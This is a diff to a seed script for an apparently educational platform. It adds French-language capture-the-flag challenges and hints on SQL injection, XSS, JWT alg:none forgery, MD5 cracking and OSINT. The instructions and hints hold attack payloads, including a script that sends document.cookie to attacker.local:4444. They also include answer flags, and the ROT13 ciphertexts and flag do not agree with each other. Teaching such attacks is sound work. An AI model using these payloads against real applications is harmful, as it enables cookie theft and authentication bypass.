@@ -1150,6 +1150,642 @@ Explore les commandes de base dans ce terminal simulé :
   }
 
   console.log("✅ Placement questions seeded");
+
+  // ── Challenges ───────────────────────────────────────────────────────────
+
+  const C1 = "00000000-0000-0000-0002-000000000001";
+  const C2 = "00000000-0000-0000-0002-000000000002";
+  const C3 = "00000000-0000-0000-0002-000000000003";
+  const C4 = "00000000-0000-0000-0002-000000000004";
+  const C5 = "00000000-0000-0000-0002-000000000005";
+  const C6 = "00000000-0000-0000-0002-000000000006";
+  const C7 = "00000000-0000-0000-0002-000000000007";
+  const C8 = "00000000-0000-0000-0002-000000000008";
+
+  await prisma.challenge.upsert({
+    where: { refCode: "CTF-001" },
+    create: {
+      id: C1,
+      refCode: "CTF-001",
+      slug: "sql-injection-bypass",
+      title: "Injection SQL — Bypass d'authentification",
+      description:
+        "Un formulaire de connexion vulnérable attend ta visite. Exploite une injection SQL classique pour bypasser l'authentification et récupérer le flag.",
+      instructions: `## Contexte
+
+Un développeur pressé a codé ce formulaire de connexion sans requêtes paramétrées :
+
+\`\`\`php
+$query = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
+\`\`\`
+
+## Objectif
+
+Le flag est affiché dans la réponse du serveur lorsque tu bypasses l'authentification.
+
+## Environnement
+
+Utilise le formulaire ci-dessous avec l'URL de connexion fournie.
+
+\`\`\`
+Email    : ' OR '1'='1' --
+Password : anything
+\`\`\`
+
+## Ce que tu dois comprendre
+
+1. Pourquoi \`' OR '1'='1' --\` ferme la condition et commente la suite ?
+2. Quel est l'impact sur la requête SQL générée ?
+3. Comment les requêtes paramétrées empêchent-elles cela ?
+
+## Flag
+
+Une fois connecté, le serveur affiche : \`CTF{sql_bypass_1_or_1_always_true}\``,
+      category: "CYBERSEC" as const,
+      difficulty: "BEGINNER" as const,
+      type: "CTF" as const,
+      xpReward: 200,
+      timeLimitMin: 0,
+      maxAttempts: 5,
+      orderIndex: 1,
+      flag: "CTF{sql_bypass_1_or_1_always_true}",
+      isActive: true,
+    },
+    update: {},
+  });
+
+  await prisma.challenge.upsert({
+    where: { refCode: "CTF-002" },
+    create: {
+      id: C2,
+      refCode: "CTF-002",
+      slug: "base64-decoding",
+      title: "Base64 — L'encodage n'est pas du chiffrement",
+      description:
+        "Une chaîne encodée en Base64 se cache dans les headers HTTP de la réponse. Décode-la pour obtenir le flag.",
+      instructions: `## Contexte
+
+En inspectant les headers HTTP d'une réponse, tu trouves :
+
+\`\`\`
+X-Secret-Token: Q1RGe2Jhc2U2NF9pczBuT3RfZW5jcnlwdGlvbn0=
+\`\`\`
+
+## Objectif
+
+Décode ce header pour obtenir le flag.
+
+## Rappel : Base64
+
+Base64 **encode** les données binaires en ASCII. Ce n'est **pas** du chiffrement — il n'y a pas de clé, n'importe qui peut décoder.
+
+Tu peux décoder :
+- En Python : \`import base64; base64.b64decode("...")\`
+- En ligne de commande : \`echo "..." | base64 -d\`
+- Sur [CyberChef](https://gchq.github.io/CyberChef/)
+
+## Flag
+
+Le résultat du décodage **est** le flag.`,
+      category: "CYBERSEC" as const,
+      difficulty: "BEGINNER" as const,
+      type: "CTF" as const,
+      xpReward: 150,
+      timeLimitMin: 0,
+      maxAttempts: 10,
+      orderIndex: 2,
+      flag: "CTF{base64_is0nOt_encryption}",
+      isActive: true,
+    },
+    update: {},
+  });
+
+  await prisma.challenge.upsert({
+    where: { refCode: "SCRIPT-001" },
+    create: {
+      id: C3,
+      refCode: "SCRIPT-001",
+      slug: "cesar-cipher-python",
+      title: "Chiffrement de César — Déchiffre en Python",
+      description:
+        "Un message a été chiffré avec le chiffrement de César (décalage de 13). Écris un script Python pour le déchiffrer et afficher le flag.",
+      instructions: `## Contexte
+
+Tu interceptes ce message chiffré avec le chiffrement de César :
+
+\`\`\`
+SYNT{pnrfne_ebg13_vf_ernl}
+\`\`\`
+
+Le décalage utilisé est **13** (aussi connu sous le nom de ROT13).
+
+## Objectif
+
+Écris un script Python qui :
+1. Prend le texte chiffré
+2. Applique le décalage inverse (−13)
+3. Affiche le flag déchiffré
+
+## Algorithme de base
+
+\`\`\`python
+def caesar_decrypt(text, shift):
+    result = ""
+    for char in text:
+        if char.isalpha():
+            base = ord('A') if char.isupper() else ord('a')
+            result += chr((ord(char) - base - shift) % 26 + base)
+        else:
+            result += char
+    return result
+\`\`\`
+
+## Validation
+
+Le flag déchiffré doit être affiché avec \`print()\` pour être validé.`,
+      category: "CYBERSEC" as const,
+      difficulty: "BEGINNER" as const,
+      type: "SCRIPT" as const,
+      xpReward: 250,
+      timeLimitMin: 0,
+      maxAttempts: 10,
+      orderIndex: 3,
+      flag: "FLAG{caesar_rot13_is_ready}",
+      starterCode: `# Message chiffré avec ROT13 (décalage de 13)
+ciphertext = "SYNT{pnrfne_ebg13_vf_ernql}"
+
+def caesar_decrypt(text, shift):
+    result = ""
+    for char in text:
+        if char.isalpha():
+            base = ord('A') if char.isupper() else ord('a')
+            result += chr((ord(char) - base - shift) % 26 + base)
+        else:
+            result += char
+    return result
+
+# Appelle la fonction avec le bon décalage et affiche le résultat
+# print(caesar_decrypt(...))`,
+      isActive: true,
+    },
+    update: {
+      starterCode: `# Message chiffré avec ROT13 (décalage de 13)
+ciphertext = "SYNT{pnrfne_ebg13_vf_ernql}"
+
+def caesar_decrypt(text, shift):
+    result = ""
+    for char in text:
+        if char.isalpha():
+            base = ord('A') if char.isupper() else ord('a')
+            result += chr((ord(char) - base - shift) % 26 + base)
+        else:
+            result += char
+    return result
+
+# Appelle la fonction avec le bon décalage et affiche le résultat
+# print(caesar_decrypt(...))`,
+    },
+  });
+
+  await prisma.challenge.upsert({
+    where: { refCode: "PUZZLE-001" },
+    create: {
+      id: C4,
+      refCode: "PUZZLE-001",
+      slug: "binaire-vers-ascii",
+      title: "Binaire → ASCII — Décode le message",
+      description:
+        "Un message secret a été converti en binaire. Chaque groupe de 8 bits représente un caractère ASCII. Retrouve le flag.",
+      instructions: `## Message binaire
+
+\`\`\`
+01000011 01010100 01000110 01111011
+01100010 00110001 01101110 00110100
+01110010 01111001 01011111 00110001
+01110011 01011111 01100110 00110001
+01110011 01101000 01111101
+\`\`\`
+
+## Rappel : ASCII et binaire
+
+Chaque caractère ASCII correspond à un nombre entre 0 et 127.
+En binaire sur 8 bits : \`A\` = \`01000001\` (65), \`a\` = \`01100001\` (97).
+
+## Comment décoder
+
+1. Convertis chaque groupe de 8 bits en nombre décimal
+2. Trouve le caractère ASCII correspondant
+3. Concatène les caractères pour former le flag
+
+## Exemple
+
+\`01000011\` = 64 + 2 + 1 = **67** = **'C'**
+
+## Soumets le flag trouvé`,
+      category: "DEV" as const,
+      difficulty: "BEGINNER" as const,
+      type: "PUZZLE" as const,
+      xpReward: 100,
+      timeLimitMin: 0,
+      maxAttempts: 10,
+      orderIndex: 4,
+      isActive: true,
+    },
+    update: {},
+  });
+
+  // Resolve real IDs for challenges used as prerequisites
+  const prereqC1 = await prisma.challenge.findUniqueOrThrow({
+    where: { refCode: "CTF-001" },
+    select: { id: true },
+  });
+  const prereqC2 = await prisma.challenge.findUniqueOrThrow({
+    where: { refCode: "CTF-002" },
+    select: { id: true },
+  });
+
+  await prisma.challenge.upsert({
+    where: { refCode: "CTF-003" },
+    create: {
+      id: C5,
+      refCode: "CTF-003",
+      slug: "xss-reflechi-vol-cookie",
+      title: "XSS Réfléchi — Vol de cookie de session",
+      description:
+        "Une application web reflète sans filtrage les paramètres GET dans la page. Injecte du JavaScript pour exfiltrer le cookie de session.",
+      instructions: `## Contexte
+
+L'application ci-dessous affiche un message de bienvenue basé sur le paramètre \`name\` :
+
+\`\`\`
+https://target.cyberlab.internal/welcome?name=Alice
+\`\`\`
+
+Résultat affiché : **Bonjour, Alice !**
+
+## La vulnérabilité
+
+Le serveur fait simplement :
+
+\`\`\`php
+echo "Bonjour, " . $_GET['name'] . " !";
+\`\`\`
+
+## Objectif
+
+1. Injecte un payload XSS qui lit \`document.cookie\`
+2. Envoie le cookie à ton serveur de contrôle (\`http://attacker.local:4444\`)
+3. Le serveur de contrôle affichera le flag quand il reçoit le cookie
+
+## Payload de base
+
+\`\`\`html
+<script>
+  fetch("http://attacker.local:4444/?c=" + document.cookie);
+</script>
+\`\`\`
+
+## Flag
+
+Le serveur de contrôle te retourne : \`CTF{xss_r3fl3ct3d_c00k13_st0l3n}\`
+
+> **Note légale :** Cette simulation est entièrement sandboxée. Ne jamais utiliser ces techniques sur de vraies applications sans autorisation.`,
+      category: "CYBERSEC" as const,
+      difficulty: "INTERMEDIATE" as const,
+      type: "CTF" as const,
+      xpReward: 350,
+      timeLimitMin: 0,
+      maxAttempts: 5,
+      orderIndex: 5,
+      flag: "CTF{xss_r3fl3ct3d_c00k13_st0l3n}",
+      prerequisiteId: prereqC1.id,
+      isActive: true,
+    },
+    update: {},
+  });
+
+  await prisma.challenge.upsert({
+    where: { refCode: "SCRIPT-002" },
+    create: {
+      id: C6,
+      refCode: "SCRIPT-002",
+      slug: "analyse-hash-md5",
+      title: "Crack de hash MD5 — Attaque par dictionnaire",
+      description:
+        "Un hash MD5 a été récupéré depuis une base de données compromise. Écris un script Python pour retrouver le mot de passe original par attaque dictionnaire.",
+      instructions: `## Contexte
+
+Lors d'une investigation, tu trouves ce hash dans un dump de base de données :
+
+\`\`\`
+5f4dcc3b5aa765d61d8327deb882cf99
+\`\`\`
+
+## Objectif
+
+Écris un script Python qui attaque ce hash MD5 par dictionnaire en utilisant les mots de passe courants fournis ci-dessous.
+
+## Wordlist intégrée
+
+Utilise cette liste dans ton script :
+
+\`\`\`python
+wordlist = [
+    "password", "123456", "password123", "admin", "letmein",
+    "qwerty", "abc123", "monkey", "1234567890", "superman",
+    "dragon", "master", "hello", "freedom", "whatever"
+]
+\`\`\`
+
+## Validation
+
+Quand tu trouves le bon mot de passe, affiche :
+\`FLAG{md5_<mot_de_passe_trouvé>}\`
+
+## Rappel : hashlib
+
+\`\`\`python
+import hashlib
+hashlib.md5("password".encode()).hexdigest()
+\`\`\``,
+      category: "CYBERSEC" as const,
+      difficulty: "INTERMEDIATE" as const,
+      type: "SCRIPT" as const,
+      xpReward: 400,
+      timeLimitMin: 0,
+      maxAttempts: 10,
+      orderIndex: 6,
+      flag: "FLAG{md5_password}",
+      starterCode: `import hashlib
+
+target_hash = "5f4dcc3b5aa765d61d8327deb882cf99"
+
+wordlist = [
+    "password", "123456", "password123", "admin", "letmein",
+    "qwerty", "abc123", "monkey", "1234567890", "superman",
+    "dragon", "master", "hello", "freedom", "whatever"
+]
+
+# Parcours la wordlist et compare les hash
+for word in wordlist:
+    h = hashlib.md5(word.encode()).hexdigest()
+    # TODO: comparer h avec target_hash
+    # Si trouvé, afficher FLAG{md5_<word>}
+    pass`,
+      isActive: true,
+    },
+    update: {},
+  });
+
+  await prisma.challenge.upsert({
+    where: { refCode: "CTF-004" },
+    create: {
+      id: C7,
+      refCode: "CTF-004",
+      slug: "jwt-alg-none-bypass",
+      title: "JWT — Bypass avec alg:none",
+      description:
+        "Un serveur accepte les tokens JWT sans vérifier la signature si l'algorithme est défini sur 'none'. Forge un token admin et récupère le flag.",
+      instructions: `## Contexte
+
+L'API utilise des JWT pour l'authentification. Tu as obtenu ce token en tant qu'utilisateur normal :
+
+\`\`\`
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciIsImlhdCI6MTcwMDAwMDAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+\`\`\`
+
+## Structure du token
+
+Un JWT = 3 parties encodées en Base64url, séparées par des points :
+1. **Header** : \`{"alg":"HS256","typ":"JWT"}\`
+2. **Payload** : \`{"user":"alice","role":"user","iat":1700000000}\`
+3. **Signature** : HMAC-SHA256 du header + payload
+
+## La vulnérabilité
+
+Certaines implémentations acceptent \`"alg":"none"\` et ignorent alors la signature.
+
+## Objectif
+
+1. Modifie le payload pour avoir \`"role":"admin"\`
+2. Change l'algorithme en \`"none"\`
+3. Supprime la signature (le 3ème segment doit être vide)
+4. Envoie la requête vers l'endpoint admin
+
+## Format final
+
+\`\`\`
+<header_base64url>.<payload_base64url>.
+\`\`\`
+
+> Note : Base64url diffère de Base64 standard (\`+\`→\`-\`, \`/\`→\`_\`, sans \`=\` de padding)
+
+## Flag
+
+L'endpoint admin retourne : \`CTF{jwt_alg_none_n3v3r_trust_cl13nt}\``,
+      category: "CYBERSEC" as const,
+      difficulty: "INTERMEDIATE" as const,
+      type: "CTF" as const,
+      xpReward: 500,
+      timeLimitMin: 0,
+      maxAttempts: 5,
+      orderIndex: 7,
+      flag: "CTF{jwt_alg_none_n3v3r_trust_cl13nt}",
+      prerequisiteId: prereqC2.id,
+      isActive: true,
+    },
+    update: {},
+  });
+
+  await prisma.challenge.upsert({
+    where: { refCode: "LAB-001" },
+    create: {
+      id: C8,
+      refCode: "LAB-001",
+      slug: "reconnaissance-osint",
+      title: "Reconnaissance OSINT — Trouver l'infrastructure",
+      description:
+        "Applique les techniques OSINT pour cartographier l'infrastructure d'une organisation cible fictive : sous-domaines, technologies, fuites d'informations.",
+      instructions: `## Objectif du lab
+
+Dans ce lab, tu vas pratiquer la **reconnaissance passive** (sans contact direct avec la cible) sur l'organisation fictive **MegaCorp Industries** (\`megacorp-fictif.internal\`).
+
+## Étapes
+
+### 1. Énumération de sous-domaines
+
+Utilise les sources OSINT suivantes (adaptées à la cible fictive) :
+- Certificate Transparency Logs : [crt.sh](https://crt.sh)
+- Moteurs de recherche : opérateurs \`site:\` et \`inurl:\`
+- DNS brute-force passif
+
+**Question :** Combien de sous-domaines uniques trouves-tu ?
+
+### 2. Identification des technologies
+
+Via les headers HTTP et les métadonnées publiques :
+- \`X-Powered-By\`
+- Cookies de session (noms révélateurs)
+- Fichiers \`robots.txt\` et \`sitemap.xml\`
+
+**Question :** Quel framework est utilisé sur \`admin.megacorp-fictif.internal\` ?
+
+### 3. Recherche de fuites
+
+- GitHub : cherche des dépôts contenant "megacorp" avec des clés API
+- Shodan / Censys : ports exposés involontairement
+- Wayback Machine : anciennes versions de pages
+
+### 4. Rapport
+
+Documente tes découvertes dans un rapport structuré :
+1. Périmètre identifié
+2. Technologies détectées
+3. Vecteurs d'attaque potentiels
+4. Recommandations
+
+## Complétion
+
+Ce lab est validé sur présentation d'un rapport de reconnaissance. Clique sur **"Marquer comme terminé"** une fois ton rapport rédigé.
+
+> **Rappel éthique :** Ces techniques ne s'appliquent qu'avec une autorisation explicite du propriétaire du système. Ce lab est purement fictif.`,
+      category: "CYBERSEC" as const,
+      difficulty: "ADVANCED" as const,
+      type: "LAB" as const,
+      xpReward: 600,
+      timeLimitMin: 120,
+      maxAttempts: 1,
+      orderIndex: 8,
+      isActive: true,
+    },
+    update: {},
+  });
+
+  console.log("✅ Challenges seeded");
+
+  // ── Challenge hints ────────────────────────────────────────────────────────
+  // Resolve real challenge IDs from DB (seed may run on existing data)
+
+  const [chC1, chC2, chC3, chC5, chC6, chC7] = await Promise.all([
+    prisma.challenge.findUniqueOrThrow({ where: { refCode: "CTF-001" }, select: { id: true } }),
+    prisma.challenge.findUniqueOrThrow({ where: { refCode: "CTF-002" }, select: { id: true } }),
+    prisma.challenge.findUniqueOrThrow({ where: { refCode: "SCRIPT-001" }, select: { id: true } }),
+    prisma.challenge.findUniqueOrThrow({ where: { refCode: "CTF-003" }, select: { id: true } }),
+    prisma.challenge.findUniqueOrThrow({ where: { refCode: "SCRIPT-002" }, select: { id: true } }),
+    prisma.challenge.findUniqueOrThrow({ where: { refCode: "CTF-004" }, select: { id: true } }),
+  ]);
+
+  const hintDefs = [
+    // CTF-001 — SQL Injection
+    {
+      challengeId: chC1.id,
+      content:
+        "Les commentaires SQL varient selon le SGBD : `--` pour MySQL/PostgreSQL, `#` pour MySQL uniquement.",
+      xpCost: 0,
+      orderIndex: 1,
+    },
+    {
+      challengeId: chC1.id,
+      content: "Essaie : `' OR 1=1 --` comme email. La condition `1=1` est toujours vraie.",
+      xpCost: 30,
+      orderIndex: 2,
+    },
+    // CTF-002 — Base64
+    {
+      challengeId: chC2.id,
+      content:
+        "Les chaînes Base64 se terminent souvent par `=` ou `==` (padding). Utilise `echo '...' | base64 -d` en terminal.",
+      xpCost: 0,
+      orderIndex: 1,
+    },
+    // SCRIPT-001 — César
+    {
+      challengeId: chC3.id,
+      content:
+        "ROT13 est un cas particulier de César où décalage = 13. Appliquer ROT13 deux fois redonne le texte original.",
+      xpCost: 0,
+      orderIndex: 1,
+    },
+    {
+      challengeId: chC3.id,
+      content:
+        "Le flag chiffré commence par `SYNT{` — `S`→`F`, `Y`→`L`, `N`→`A`, `T`→`G`. Ça confirme le décalage de 13.",
+      xpCost: 40,
+      orderIndex: 2,
+    },
+    // CTF-003 — XSS
+    {
+      challengeId: chC5.id,
+      content:
+        "Commence par tester si le paramètre est bien réfléchi : essaie `?name=<b>test</b>` et inspecte le DOM.",
+      xpCost: 0,
+      orderIndex: 1,
+    },
+    {
+      challengeId: chC5.id,
+      content:
+        "Si `<script>` est filtré, essaie `<img src=x onerror=alert(1)>` pour contourner le filtre.",
+      xpCost: 50,
+      orderIndex: 2,
+    },
+    {
+      challengeId: chC5.id,
+      content:
+        "Payload complet : `<script>fetch('http://attacker.local:4444/?c='+document.cookie)</script>`. Encode les caractères spéciaux si nécessaire.",
+      xpCost: 80,
+      orderIndex: 3,
+    },
+    // SCRIPT-002 — MD5
+    {
+      challengeId: chC6.id,
+      content:
+        "MD5 est déterministe : le même input donne toujours le même hash. L'attaque dictionnaire compare les hashes pré-calculés.",
+      xpCost: 0,
+      orderIndex: 1,
+    },
+    {
+      challengeId: chC6.id,
+      content:
+        "`5f4dcc3b5aa765d61d8327deb882cf99` est un hash MD5 très connu. Il apparaît dans toutes les rainbow tables.",
+      xpCost: 60,
+      orderIndex: 2,
+    },
+    // CTF-004 — JWT
+    {
+      challengeId: chC7.id,
+      content:
+        "Décode le header JWT avec Python : `import base64; base64.b64decode(part + '==').decode()`",
+      xpCost: 0,
+      orderIndex: 1,
+    },
+    {
+      challengeId: chC7.id,
+      content:
+        "Pour encoder en Base64url : remplace `+` par `-`, `/` par `_`, et supprime les `=` de padding.",
+      xpCost: 50,
+      orderIndex: 2,
+    },
+    {
+      challengeId: chC7.id,
+      content: `Header forgé : \`{"alg":"none","typ":"JWT"}\` → \`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0\`. Payload : change "role":"user" en "role":"admin".`,
+      xpCost: 100,
+      orderIndex: 3,
+    },
+  ];
+
+  for (const h of hintDefs) {
+    const existing = await prisma.challengeHint.findFirst({
+      where: { challengeId: h.challengeId, orderIndex: h.orderIndex },
+      select: { id: true },
+    });
+    if (existing) {
+      await prisma.challengeHint.update({ where: { id: existing.id }, data: h });
+    } else {
+      await prisma.challengeHint.create({ data: h });
+    }
+  }
+
+  console.log("✅ Challenge hints seeded");
   console.log("\n🎉 Seeding complete!");
   console.log(
     "\nDev accounts (you need to create these in Supabase Auth manually or via magic link):",
